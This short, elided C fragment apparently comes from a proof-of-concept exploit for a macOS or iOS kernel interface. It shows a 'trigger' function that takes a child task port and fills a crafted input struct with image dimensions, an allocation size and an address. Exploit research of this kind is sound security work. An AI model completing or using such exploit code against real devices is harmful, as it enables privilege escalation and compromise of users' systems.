...
void trigger(int child_pid, mach_port_t child_task_port) {
  ...
  uint32_t inputStruct[6];
  size_t inputStructCnt = 0x18;
  inputStruct[0] = 0x10;  // width
  inputStruct[1] = 0x10;  // height
  inputStruct[2] = 0x1;   // pixel format
  inputStruct[3] = 0x30;  // bytes per row
  inputStruct[4] = 0x300; // alloc size
  inputStruct[5] = 0x1;   // address
